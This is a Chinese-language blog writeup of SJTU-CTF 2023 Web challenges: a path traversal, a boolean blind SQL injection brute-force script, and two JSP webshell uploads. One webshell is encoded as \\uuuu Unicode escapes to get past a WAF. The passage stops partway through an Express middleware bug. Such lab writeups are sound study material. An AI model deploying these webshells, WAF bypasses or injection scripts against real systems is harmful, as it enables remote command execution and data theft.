<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"><meta http-equiv="x-dns-prefetch-control" content="on"><meta name="viewport" content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no"><meta name="renderer" content="webkit"><meta name="force-rendering" content="webkit"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="HandheldFriendly" content="True"><meta name="mobile-web-app-capable" content="yes"><link rel="shortcut icon" href="https://hans362-img.oss.0vv0.top/favicon.ico"><link rel="icon" type="image/png" sizes="16x16" href="https://hans362-img.oss.0vv0.top/favicon-16x16.png"><link rel="icon" type="image/png" sizes="32x32" href="https://hans362-img.oss.0vv0.top/favicon-32x32.png"><link rel="apple-touch-icon" sizes="180x180" href="https://hans362-img.oss.0vv0.top/apple-touch-icon.png"><link rel="mask-icon" href="https://hans362-img.oss.0vv0.top/safari-pinned-tab.svg"><title>SJTU-CTF 2023 Writeup | Hans362 &#39;s Blog</title><meta name="keywords" content="Web, 网络安全, CTF, Crypto, Reverse, Pwnable, Misc, Writeup, 解题报告, Hans362"><meta name="description" content="好久没更新博客了，周记已经咕咕咕好几个月了，等有空再写吧（ 作为一个非计算机和信息安全专业学生、除了 Web 方向会一点其它啥都不会的小白，前段时间参加了我校举办的 CTF 网络安全技术挑战赛。给官方提交了 Writeup 后想着不能浪费这水文章的大好机会，就在博客上也发一遍吧。"><meta property="og:type" content="article"><meta property="og:title" content="SJTU-CTF 2023 Writeup"><meta property="og:url" content="https://blog.hans362.cn/post/sjtu-ctf-2023-writeup/"><meta property="og:site_name" content="Hans362 &#39;s Blog"><meta property="og:description" content="好久没更新博客了，周记已经咕咕咕好几个月了，等有空再写吧（ 作为一个非计算机和信息安全专业学生、除了 Web 方向会一点其它啥都不会的小白，前段时间参加了我校举办的 CTF 网络安全技术挑战赛。给官方提交了 Writeup 后想着不能浪费这水文章的大好机会，就在博客上也发一遍吧。"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://hans362-img.oss.0vv0.top/2023/03/13/86cd66e3c56c1b9e4b60a33bf8d7b723.png?width=1920"><meta property="article:published_time" content="2023-03-16T15:33:33.000Z"><meta property="article:modified_time" content="2025-04-11T10:35:15.358Z"><meta property="article:author" content="Hans362"><meta property="article:tag" content="Web"><meta property="article:tag" content="网络安全"><meta property="article:tag" content="CTF"><meta property="article:tag" content="Crypto"><meta property="article:tag" content="Reverse"><meta property="article:tag" content="Pwnable"><meta property="article:tag" content="Misc"><meta property="article:tag" content="Writeup"><meta property="article:tag" content="解题报告"><meta name="twitter:card" content="summary_large_image"><meta name="twitter:image" content="https://hans362-img.oss.0vv0.top/2023/03/13/86cd66e3c56c1b9e4b60a33bf8d7b723.png?width=1920"><link rel="stylesheet" href="/css/style/main.css"><link rel="stylesheet" id="hl-default-theme" href="https://blog.hans362.cn/npm/highlight.js@10.1.2/styles/atom-one-light.css" media="none"><link rel="stylesheet" id="hl-dark-theme" href="https://blog.hans362.cn/npm/highlight.js@10.1.2/styles/atom-one-dark.css" media="none"><script src="/js/darkmode.js"></script><link rel="dns-prefetch" href="https://analytics.0vv0.top"><link rel="preconnect" href="https://hans362-img.oss.0vv0.top"><meta name="generator" content="Hexo 7.1.1"><link rel="alternate" href="/atom.xml" title="Hans362 's Blog" type="application/atom+xml"></head><body><div class="app-shell-loader">加载中...</div><div class="container" tabindex="-1"><header><div class="header__left"><a href="/" class="button"><span class="logo__text">Hans362 &#39;s Blog</span></a></div><div class="header__right"><div class="navbar__menus"><a href="/" class="button"><div class="navbar-menu">首页</div></a><a href="/archives/" class="button"><div class="navbar-menu">归档</div></a><a href="/tags/" class="button"><div class="navbar-menu">标签</div></a><a href="/bangumi/" class="button"><div class="navbar-menu">追番</div></a><a href="/links/" class="button"><div class="navbar-menu">友链</div></a><a href="/about/" class="button"><div class="navbar-menu">关于</div></a><a href="/atom.xml" class="button"><div class="navbar-menu">RSS</div></a></div><a href="/search/" class="button"><div id="btn-search"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1024 1024" width="24" height="24" fill="currentColor" stroke="currentColor" stroke-width="32"><path d="M192 448c0-141.152 114.848-256 256-256s256 114.848 256 256-114.848 256-256 256-256-114.848-256-256z m710.624 409.376l-206.88-206.88A318.784 318.784 0 0 0 768 448c0-176.736-143.264-320-320-320S128 271.264 128 448s143.264 320 320 320a318.784 318.784 0 0 0 202.496-72.256l206.88 206.88 45.248-45.248z"></path></svg></div></a><a href="javaScript:void(0);" rel="external nofollow noreferrer" class="button"><div id="btn-toggle-dark"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path></svg></div></a><a href="#" class="button" id="b2t" aria-label="回到顶部" title="回到顶部"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1024 1024" width="32" height="32"><path d="M233.376 722.752L278.624 768 512 534.624 745.376 768l45.248-45.248L512 444.128zM192 352h640V288H192z" fill="currentColor"></path></svg> </a><a class="dropdown-icon button" tabindex="0"><div id="btn-dropdown"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" width="24" height="24" fill="none" stroke="currentColor" stroke-width="0.7" stroke-linecap="round" stroke-linejoin="round"><path fill="currentColor" d="M3.314,4.8h13.372c0.41,0,0.743-0.333,0.743-0.743c0-0.41-0.333-0.743-0.743-0.743H3.314c-0.41,0-0.743,0.333-0.743,0.743C2.571,4.467,2.904,4.8,3.314,4.8z M16.686,15.2H3.314c-0.41,0-0.743,0.333-0.743,0.743s0.333,0.743,0.743,0.743h13.372c0.41,0,0.743-0.333,0.743-0.743S17.096,15.2,16.686,15.2z M16.686,9.257H3.314c-0.41,0-0.743,0.333-0.743,0.743s0.333,0.743,0.743,0.743h13.372c0.41,0,0.743-0.333,0.743-0.743S17.096,9.257,16.686,9.257z"></path></svg></div></a><div class="dropdown-menus" id="dropdown-menus"><a href="/" class="dropdown-menu button">首页</a> <a href="/archives/" class="dropdown-menu button">归档</a> <a href="/tags/" class="dropdown-menu button">标签</a> <a href="/bangumi/" class="dropdown-menu button">追番</a> <a href="/links/" class="dropdown-menu button">友链</a> <a href="/about/" class="dropdown-menu button">关于</a> <a href="/atom.xml" class="dropdown-menu button">RSS</a></div></div></header><cover></cover><main><div class="post-content"><div class="post-title"><h1 class="post-title__text">SJTU-CTF 2023 Writeup</h1><div class="post-title__meta"><a href="/archives/2023/03/" class="post-meta__date button">2023-03-16</a> <span class="separate-dot"></span> <a href="/categories/%E6%B0%B4/" class="button"><span class="post-meta__cats">水</span></a><style>.post-meta__pv{color:var(--t-l);visibility:hidden;opacity:0;transition:.2s}</style><span class="separate-dot"></span> <span class="post-meta__pv"></span></div></div><aside class="post-side"><div class="post-side__toc"><div class="toc-title">文章目录</div><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#web"><span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#flag-gallery"><span class="toc-text">flag gallery</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mimic-sql-part-1"><span class="toc-text">Mimic SQL (part 1)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ezjsp"><span class="toc-text">ezjsp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ezjsp2"><span class="toc-text">ezjsp2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#baby-express"><span class="toc-text">baby express</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exsecurity_flag_p"><span class="toc-text">exsecurity_flag_p</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exsecurity_flag_r"><span class="toc-text">exsecurity_flag_r</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exsecurity_flag_h"><span class="toc-text">exsecurity_flag_h</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exsecurity_flag_s"><span class="toc-text">exsecurity_flag_s</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#baby-php"><span class="toc-text">baby php</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwnable"><span class="toc-text">Pwnable</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E7%9A%84rpg1"><span class="toc-text">简单的RPG1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E7%9A%84rpg2"><span class="toc-text">简单的RPG2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E7%9A%84rpg3"><span class="toc-text">简单的RPG3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E7%9A%84rpg4"><span class="toc-text">简单的RPG4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E7%9A%84rpg5"><span class="toc-text">简单的RPG5</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#reverse"><span class="toc-text">Reverse</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#endless"><span class="toc-text">Endless</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#easymba"><span class="toc-text">EasyMBA</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#crypto"><span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#baby-rsa"><span class="toc-text">Baby RSA</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#child-rsa"><span class="toc-text">Child RSA</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#rsfl"><span class="toc-text">RSFL</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#misc"><span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#tiny-elf"><span class="toc-text">Tiny ELF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#baby-mitm"><span class="toc-text">Baby Mitm</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#baby-equation"><span class="toc-text">Baby Equation</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#toms-cheese"><span class="toc-text">Tom’s Cheese</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-text">总结</span></a></li></ol></div></aside><a class="btn-toc button" id="btn-toc" tabindex="0"><svg viewBox="0 0 1024 1024" width="32" height="32" xmlns="http://www.w3.org/2000/svg"><path d="M128 256h64V192H128zM320 256h576V192H320zM128 544h64v-64H128zM320 544h576v-64H320zM128 832h64v-64H128zM320 832h576v-64H320z" fill="currentColor"></path></svg></a><div class="toc-menus" id="toc-menus"><div class="toc-title">文章目录</div><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#web"><span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#flag-gallery"><span class="toc-text">flag gallery</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mimic-sql-part-1"><span class="toc-text">Mimic SQL (part 1)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ezjsp"><span class="toc-text">ezjsp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ezjsp2"><span class="toc-text">ezjsp2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#baby-express"><span class="toc-text">baby express</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exsecurity_flag_p"><span class="toc-text">exsecurity_flag_p</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exsecurity_flag_r"><span class="toc-text">exsecurity_flag_r</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exsecurity_flag_h"><span class="toc-text">exsecurity_flag_h</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exsecurity_flag_s"><span class="toc-text">exsecurity_flag_s</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#baby-php"><span class="toc-text">baby php</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwnable"><span class="toc-text">Pwnable</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E7%9A%84rpg1"><span class="toc-text">简单的RPG1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E7%9A%84rpg2"><span class="toc-text">简单的RPG2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E7%9A%84rpg3"><span class="toc-text">简单的RPG3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E7%9A%84rpg4"><span class="toc-text">简单的RPG4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E7%9A%84rpg5"><span class="toc-text">简单的RPG5</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#reverse"><span class="toc-text">Reverse</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#endless"><span class="toc-text">Endless</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#easymba"><span class="toc-text">EasyMBA</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#crypto"><span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#baby-rsa"><span class="toc-text">Baby RSA</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#child-rsa"><span class="toc-text">Child RSA</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#rsfl"><span class="toc-text">RSFL</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#misc"><span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#tiny-elf"><span class="toc-text">Tiny ELF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#baby-mitm"><span class="toc-text">Baby Mitm</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#baby-equation"><span class="toc-text">Baby Equation</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#toms-cheese"><span class="toc-text">Tom’s Cheese</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-text">总结</span></a></li></ol></div><article class="post post__with-toc card"><div class="post__header"><img alt="Cover Image" class="lazy" src="https://hans362-img.oss.0vv0.top/2023/03/13/86cd66e3c56c1b9e4b60a33bf8d7b723.png?width=1920" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABAQMAAAAl21bKAAAABlBMVEXMzMyWlpYU2uzLAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAACklEQVQImWNgAAAAAgAB9HFkpgAAAABJRU5ErkJggg==" data-srcset="https://hans362-img.oss.0vv0.top/2023/03/13/86cd66e3c56c1b9e4b60a33bf8d7b723.png?width=1920"><div class="post__expire" id="post-expired-notify"><p><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 16 16" style="fill:#f5a623;stroke:#f5a623"><path fill-rule="evenodd" d="M8.893 1.5c-.183-.31-.52-.5-.887-.5s-.703.19-.886.5L.138 13.499a.98.98 0 0 0 0 1.001c.193.31.53.501.886.501h13.964c.367 0 .704-.19.877-.5a1.03 1.03 0 0 0 .01-1.002L8.893 1.5zm.133 11.497H6.987v-2.003h2.039v2.003zm0-3.004H6.987V5.987h2.039v4.006z"></path></svg> 本文最后更新于 <span id="expire-date"></span> 天前，文中部分描述可能已经过时。</p></div><script>(()=>{var e=Date.parse("2023-03-16"),t=(new Date).getTime(),t=Math.floor((t-e)/864e5);120<=t&&(document.querySelectorAll("#expire-date")[0].innerHTML=t,document.querySelectorAll("#post-expired-notify")[0].style.display="block")})()</script></div><div class="post__content"><html><head><script>var meting_api="https://api-v2.hans362.cn/vip/?server=:server&type=:type&id=:id&r=:r"</script><script class="meting-secondary-script-marker" src="/js/Meting.min.js"></script></head><body><p>好久没更新博客了，周记已经咕咕咕好几个月了，等有空再写吧（</p><p>作为一个非计算机和信息安全专业学生、除了 Web 方向会一点其它啥都不会的小白，前段时间参加了我校举办的 CTF 网络安全技术挑战赛。给官方提交了 Writeup 后想着不能浪费这水文章的大好机会，就在博客上也发一遍吧。</p><span id="more"></span><h2 id="web"><a class="markdownIt-Anchor" href="#web"></a> Web</h2><h3 id="flag-gallery"><a class="markdownIt-Anchor" href="#flag-gallery"></a> flag gallery</h3><p>网站首页有一堆旗子的图片，尝试乱填一个账号登录发现多了一个 CTF 旗子，提示需要管理员账号才能查看。F12 看了一眼发现这些旗子的图片都是从 <code>/getflag.php?flag=</code> 这个接口获取的。</p><p><img src="https://hans362-img.oss.0vv0.top/2023/03/12/upload_2569b9cd2f8d10f21c01def7a2320a6b.png?width=1920" class="lazy" data-srcset="https://hans362-img.oss.0vv0.top/2023/03/12/upload_2569b9cd2f8d10f21c01def7a2320a6b.png?width=1920" srcset="/loading.gif" alt=""></p><p>于是向接口请求一个不存在的文件，出现 PHP 错误信息。</p><p><img src="https://hans362-img.oss.0vv0.top/2023/03/12/upload_c5152f7b2d51b71a6999eaff2f46ab63.png?width=1920" class="lazy" data-srcset="https://hans362-img.oss.0vv0.top/2023/03/12/upload_c5152f7b2d51b71a6999eaff2f46ab63.png?width=1920" srcset="/loading.gif" alt=""></p><p>根据错误信息可知，这个接口应该只是简单地返回 <code>images</code> 目录下用户请求的文件，那么我们如果请求一下 <code>../login.php</code> 呢？</p><p><img src="https://hans362-img.oss.0vv0.top/2023/03/12/upload_772d38afa107dedb72fca9e7507be7ee.png?width=1920" class="lazy" data-srcset="https://hans362-img.oss.0vv0.top/2023/03/12/upload_772d38afa107dedb72fca9e7507be7ee.png?width=1920" srcset="/loading.gif" alt=""></p><p>直接爆出源代码，拿到 <code>admin</code> 密码的 MD5 值，解密一下发现是 <code>sjtuctf</code>，回主页登录，然后拿到 flag。</p><p><img src="https://hans362-img.oss.0vv0.top/2023/03/12/upload_72be3978d4ce63052bbaca8f53e94d02.png?width=1920" class="lazy" data-srcset="https://hans362-img.oss.0vv0.top/2023/03/12/upload_72be3978d4ce63052bbaca8f53e94d02.png?width=1920" srcset="/loading.gif" alt=""></p><h3 id="mimic-sql-part-1"><a class="markdownIt-Anchor" href="#mimic-sql-part-1"></a> Mimic SQL (part 1)</h3><p>显然应该是道 SQL 注入题，唯一的注入点应该是 <code>/article?id=</code>。跑了下 sqlmap，发现存在 Boolean-based SQL Injection，准备开始盲注。</p><p>但这道题比较特殊之处在于整了一个什么拟态防御，就是同时运行了 SQLite、MySQL 和 MariaDB 三种数据库，并同时向三个数据库跑查询，然后比对结果是否一致，不一致就会报错。因此注入的时候要兼顾三种数据库的要求。</p><p>经过亿些尝试，发现通过 <code>/article?id=1 and (select length(flag) from flag) &gt; 1</code> 可以搞出 flag 的长度，只需要用一下二分法，最终发现 <code>&gt; 37</code> 时能够返回文章内容，而 <code>&gt; 38</code> 时出现 <code>Not Found</code>，说明 flag 长度正是38。</p><p>接着又经过亿些尝试，发现通过 <code>/article?id=1 and (select substr(flag,1,1) from flag) = 'a'</code> 并把 <code>a</code> 依次替换成所有可打印字符，就可以根据返回结果是否为 <code>Not Found</code> 试出 <code>flag</code> 的第一位，然后用相同的原理往后依次试出每一位即可。</p><p>于是写了个 Python 脚本自动化这个过程。</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> quote
<span class="hljs-keyword">import</span> string


url = <span class="hljs-string">"http://127.0.0.1:5000/article?id=1"</span>

<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">39</span>):
    <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> string.printable:
        req = url + \
            quote(
                <span class="hljs-string">" and (select substr(flag,"</span> + <span class="hljs-built_in">str</span>(i) + <span class="hljs-string">",1) from flag) = '"</span> + c + <span class="hljs-string">"'"</span>)
        r = requests.get(req)
        <span class="hljs-keyword">if</span> <span class="hljs-string">"Not Found"</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> r.text:
            <span class="hljs-built_in">print</span>(c, end=<span class="hljs-string">''</span>)
            <span class="hljs-keyword">break</span></code></pre><p>最后得到了 flag。</p><p><img src="https://hans362-img.oss.0vv0.top/2023/03/12/upload_85e1f6302a74150cdaad770ec6a4d269.png?width=1920" class="lazy" data-srcset="https://hans362-img.oss.0vv0.top/2023/03/12/upload_85e1f6302a74150cdaad770ec6a4d269.png?width=1920" srcset="/loading.gif" alt=""></p><p>（引号要换成大括号）</p><h3 id="ezjsp"><a class="markdownIt-Anchor" href="#ezjsp"></a> ezjsp</h3><p>尝试直接传个带回显的 WebShell 上去，没想到就成功了。</p><pre><code class="hljs jsp">&lt;%
    <span class="hljs-keyword">if</span>(<span class="hljs-string">"passwd"</span>.equals(request.getParameter(<span class="hljs-string">"pwd"</span>))){
        java.io.<span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(request.getParameter(<span class="hljs-string">"p"</span>)).getInputStream();
        <span class="hljs-type">int</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> -<span class="hljs-number">1</span>;
        <span class="hljs-type">byte</span>[] b = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">2048</span>];
        out.print(<span class="hljs-string">"&lt;pre&gt;"</span>);
        <span class="hljs-keyword">while</span>((a=in.read(b))!=-<span class="hljs-number">1</span>){
            out.print(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(b));
        }
        out.print(<span class="hljs-string">"&lt;/pre&gt;"</span>);
    }
%&gt;</code></pre><p>然后尝试直接 <code>?pwd=passwd&amp;p=cat /flag</code> 发现权限不够，于是又试了试 <code>?pwd=passwd&amp;p=/readflag</code>，成功拿到了 flag。</p><p><img src="https://hans362-img.oss.0vv0.top/2023/03/12/upload_8896484db15b4ffa2a8f3c7ca81318e1.png?width=1920" class="lazy" data-srcset="https://hans362-img.oss.0vv0.top/2023/03/12/upload_8896484db15b4ffa2a8f3c7ca81318e1.png?width=1920" srcset="/loading.gif" alt=""></p><h3 id="ezjsp2"><a class="markdownIt-Anchor" href="#ezjsp2"></a> ezjsp2</h3><p>前一题的加强版，这次就没这么好做了，直接传 WebShell 被 WAF 拦截了。分析了下代码，发现过滤条件很苛刻。</p><pre><code class="hljs jsp"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">Pattern</span> <span class="hljs-variable">pattern</span> <span class="hljs-operator">=</span> Pattern.compile(<span class="hljs-string">"\\.|\\[|\\]|\\\\u[0-9A-Fa-f]|&lt;%@|&lt;jsp:"</span>);</code></pre><p>然后我花了大量时间去构造一个能够绕过这个 pattern 的 WebShell，结果都以失败告终，因为想要代码里没有<code>.</code>几乎是不可能的，而这个 WAF 居然把<code>.</code>都给拦截了。</p><p>于是到处寻找利用其它编码形式绕过 WAF 的方法，终于发现原来 JSP 不仅能够直接解析 <code>\u0000</code> 这种 Unicode，事实上如果写成 <code>\uuuu0000</code> 也是可以的，而这个 WAF 只过滤了前者，所以只要把前一题的那个 WebShell 转成 Unicode 并写成 <code>\uuuu0000</code> 的形式即可。</p><pre><code class="hljs jsp">&lt;%\uuuu0069\uuuu0066\uuuu0028\uuuu0022\uuuu0070\uuuu0061\uuuu0073\uuuu0073\uuuu0077\uuuu0064\uuuu0022\uuuu002e\uuuu0065\uuuu0071\uuuu0075\uuuu0061\uuuu006c\uuuu0073\uuuu0028\uuuu0072\uuuu0065\uuuu0071\uuuu0075\uuuu0065\uuuu0073\uuuu0074\uuuu002e\uuuu0067\uuuu0065\uuuu0074\uuuu0050\uuuu0061\uuuu0072\uuuu0061\uuuu006d\uuuu0065\uuuu0074\uuuu0065\uuuu0072\uuuu0028\uuuu0022\uuuu0070\uuuu0077\uuuu0064\uuuu0022\uuuu0029\uuuu0029\uuuu0029\uuuu007b\uuuu006a\uuuu0061\uuuu0076\uuuu0061\uuuu002e\uuuu0069\uuuu006f\uuuu002e\uuuu0049\uuuu006e\uuuu0070\uuuu0075\uuuu0074\uuuu0053\uuuu0074\uuuu0072\uuuu0065\uuuu0061\uuuu006d\uuuu0020\uuuu0069\uuuu006e\uuuu0020\uuuu003d\uuuu0020\uuuu0052\uuuu0075\uuuu006e\uuuu0074\uuuu0069\uuuu006d\uuuu0065\uuuu002e\uuuu0067\uuuu0065\uuuu0074\uuuu0052\uuuu0075\uuuu006e\uuuu0074\uuuu0069\uuuu006d\uuuu0065\uuuu0028\uuuu0029\uuuu002e\uuuu0065\uuuu0078\uuuu0065\uuuu0063\uuuu0028\uuuu0072\uuuu0065\uuuu0071\uuuu0075\uuuu0065\uuuu0073\uuuu0074\uuuu002e\uuuu0067\uuuu0065\uuuu0074\uuuu0050\uuuu0061\uuuu0072\uuuu0061\uuuu006d\uuuu0065\uuuu0074\uuuu0065\uuuu0072\uuuu0028\uuuu0022\uuuu0070\uuuu0022\uuuu0029\uuuu0029\uuuu002e\uuuu0067\uuuu0065\uuuu0074\uuuu0049\uuuu006e\uuuu0070\uuuu0075\uuuu0074\uuuu0053\uuuu0074\uuuu0072\uuuu0065\uuuu0061\uuuu006d\uuuu0028\uuuu0029\uuuu003b\uuuu0069\uuuu006e\uuuu0074\uuuu0020\uuuu0061\uuuu0020\uuuu003d\uuuu0020\uuuu002d\uuuu0031\uuuu003b\uuuu0062\uuuu0079\uuuu0074\uuuu0065\uuuu005b\uuuu005d\uuuu0020\uuuu0062\uuuu0020\uuuu003d\uuuu0020\uuuu006e\uuuu0065\uuuu0077\uuuu0020\uuuu0062\uuuu0079\uuuu0074\uuuu0065\uuuu005b\uuuu0032\uuuu0030\uuuu0034\uuuu0038\uuuu005d\uuuu003b\uuuu006f\uuuu0075\uuuu0074\uuuu002e\uuuu0070\uuuu0072\uuuu0069\uuuu006e\uuuu0074\uuuu0028\uuuu0022\uuuu003c\uuuu0070\uuuu0072\uuuu0065\uuuu003e\uuuu0022\uuuu0029\uuuu003b\uuuu0077\uuuu0068\uuuu0069\uuuu006c\uuuu0065\uuuu0028\uuuu0028\uuuu0061\uuuu003d\uuuu0069\uuuu006e\uuuu002e\uuuu0072\uuuu0065\uuuu0061\uuuu0064\uuuu0028\uuuu0062\uuuu0029\uuuu0029\uuuu0021\uuuu003d\uuuu002d\uuuu0031\uuuu0029\uuuu007b\uuuu006f\uuuu0075\uuuu0074\uuuu002e\uuuu0070\uuuu0072\uuuu0069\uuuu006e\uuuu0074\uuuu0028\uuuu006e\uuuu0065\uuuu0077\uuuu0020\uuuu0053\uuuu0074\uuuu0072\uuuu0069\uuuu006e\uuuu0067\uuuu0028\uuuu0062\uuuu0029\uuuu0029\uuuu003b\uuuu007d\uuuu006f\uuuu0075\uuuu0074\uuuu002e\uuuu0070\uuuu0072\uuuu0069\uuuu006e\uuuu0074\uuuu0028\uuuu0022\uuuu003c\uuuu002f\uuuu0070\uuuu0072\uuuu0065\uuuu003e\uuuu0022\uuuu0029\uuuu003b\uuuu007d%&gt;</code></pre><p>然后就和前一题一样的方法拿到了 flag。</p><p><img src="https://hans362-img.oss.0vv0.top/2023/03/12/upload_ee4c035360bd2ae0fc3af3792063dd00.png?width=1920" class="lazy" data-srcset="https://hans362-img.oss.0vv0.top/2023/03/12/upload_ee4c035360bd2ae0fc3af3792063dd00.png?width=1920" srcset="/loading.gif" alt=""></p><h3 id="baby-express"><a class="markdownIt-Anchor" href="#baby-express"></a> baby express</h3><p>源代码都直接正大光明给你看了，读了好几遍感觉似乎确实没啥漏洞，利用条件都形成了一个闭环。不过既然源代码第一行说 <code>code modified from https://github.com/expressjs/express/blob/4.x/examples/auth/index.js</code>，那我就一行一行好好比对一下，看看到底修改了哪些地方吧。</p><p>结果一看还真发现了问题，在 <code>restrict()</code> 这个中间件的实现，人家原本写的是：</p><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">restrict</span>(<span class="hljs-params">req, res, next</span>) {
  <span class="hljs-keyword">if</span> (req.<span class="hljs-property">session</span>.<span class="hljs-property">user</span>) {
    <span class="hljs-title function_">next</span>();
  } <span class="hljs-keyword">else</span> {
    req.<span class="hljs-property">session</span>.<span class="hljs-property">error</span> = <span class="hljs-string">'Access denied!'</span>;
    res.<span class="hljs-title function_">redirect</span>(<span class="hljs-string">'/login'</span>);
  }
}</code></pre><p>修改之后变成了：</p><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">restrict</span>(<span class="hljs-params">req, res, next</span>) {
  <span class="hljs-keyword">if</span> (!req.<span class="hljs-property">session</span>.<span class="hljs-property">user</span> || !req.<span class="hljs-property">session</span>.<span class="hljs-property">user</span>.<span class="hljs-property">admin</span>) {
    res.<span class="hljs-title function_">redirect</span>(<span class="hljs-string">'/'</span>);
  }
  <span class="hljs-title function_">next</span>();
